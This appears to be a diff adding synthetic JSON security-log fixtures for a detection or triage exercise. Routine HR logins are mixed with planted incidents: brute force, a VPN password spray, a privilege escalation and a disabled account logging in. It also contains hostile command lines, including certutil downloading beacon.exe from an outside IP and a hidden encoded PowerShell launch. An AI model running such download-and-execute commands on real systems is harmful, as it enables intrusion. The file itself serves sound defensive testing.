@@ -1,0 +1,48 @@
+{"timestamp": "2024-11-02T08:00:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.33", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:03:00Z", "event_type": "authentication", "action": "login_success", "user": "dburns", "source_ip": "10.4.12.24", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:06:00Z", "event_type": "authentication", "action": "login_success", "user": "mrivera", "source_ip": "10.4.12.34", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:09:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.21", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:12:00Z", "event_type": "authentication", "action": "login_success", "user": "mrivera", "source_ip": "10.4.12.25", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:15:00Z", "event_type": "authentication", "action": "login_success", "user": "mrivera", "source_ip": "10.4.12.25", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:18:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.21", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:21:00Z", "event_type": "authentication", "action": "login_success", "user": "mrivera", "source_ip": "10.4.12.32", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:24:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.33", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:27:00Z", "event_type": "authentication", "action": "login_success", "user": "mrivera", "source_ip": "10.4.12.23", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:30:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.21", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:33:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.21", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:36:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.32", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:39:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.35", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T08:42:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.31", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:00:00Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:00:30Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:01:00Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:01:30Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:02:00Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:02:30Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:03:00Z", "event_type": "authentication", "action": "login_failed", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T09:04:00Z", "event_type": "authentication", "action": "login_success", "user": "administrator", "source_ip": "203.0.113.66", "host": "WIN-DC-01", "country": "RU"}
+{"timestamp": "2024-11-02T10:00:00Z", "event_type": "authentication", "action": "login_failed", "user": "jsheetz", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:00:20Z", "event_type": "authentication", "action": "login_failed", "user": "mrivera", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:00:40Z", "event_type": "authentication", "action": "login_failed", "user": "kpatel", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:01:00Z", "event_type": "authentication", "action": "login_failed", "user": "dburns", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:01:20Z", "event_type": "authentication", "action": "login_failed", "user": "tallen", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:01:40Z", "event_type": "authentication", "action": "login_failed", "user": "rgomez", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:02:00Z", "event_type": "authentication", "action": "login_failed", "user": "lchen", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:02:20Z", "event_type": "authentication", "action": "login_failed", "user": "pmalik", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:02:40Z", "event_type": "authentication", "action": "login_failed", "user": "swagner", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:03:00Z", "event_type": "authentication", "action": "login_failed", "user": "bfoster", "source_ip": "198.51.100.23", "host": "VPN-GW-01", "country": "US"}
+{"timestamp": "2024-11-02T10:30:00Z", "event_type": "process", "action": "process_start", "user": "mrivera", "host": "WIN-HR-07", "process": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABJAFcAUgApAA==", "source_ip": "10.4.12.31", "country": "US"}
+{"timestamp": "2024-11-02T10:35:00Z", "event_type": "process", "action": "process_start", "user": "mrivera", "host": "WIN-HR-07", "process": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://203.0.113.90/beacon.exe c:\\temp\\b.exe", "source_ip": "10.4.12.31", "country": "US"}
+{"timestamp": "2024-11-02T10:40:00Z", "event_type": "process", "action": "process_start", "user": "dburns", "host": "WIN-FIN-03", "process": "cmd.exe", "command_line": "cmd.exe /c payload.bat parent=winword.exe", "source_ip": "10.4.12.28", "country": "US"}
+{"timestamp": "2024-11-02T11:00:00Z", "event_type": "account", "action": "privilege_granted", "user": "svc_backup", "host": "WIN-DC-01", "command_line": "member=svc_backup group=Domain Admins added_by=administrator", "source_ip": "203.0.113.66", "country": "RU"}
+{"timestamp": "2024-11-02T11:10:00Z", "event_type": "authentication", "action": "login_success", "user": "former_intern", "host": "WIN-FIN-03", "command_line": "account_state=disabled logon_type=10", "source_ip": "198.51.100.77", "country": "US"}
+{"timestamp": "2024-11-02T09:00:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.26", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:07:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.38", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:14:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.25", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:21:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.30", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:28:00Z", "event_type": "authentication", "action": "login_success", "user": "kpatel", "source_ip": "10.4.12.36", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:35:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.31", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:42:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.30", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:49:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.37", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T09:56:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.35", "host": "WIN-HR-07", "country": "US"}
+{"timestamp": "2024-11-02T10:03:00Z", "event_type": "authentication", "action": "login_success", "user": "jsheetz", "source_ip": "10.4.12.38", "host": "WIN-HR-07", "country": "US"}
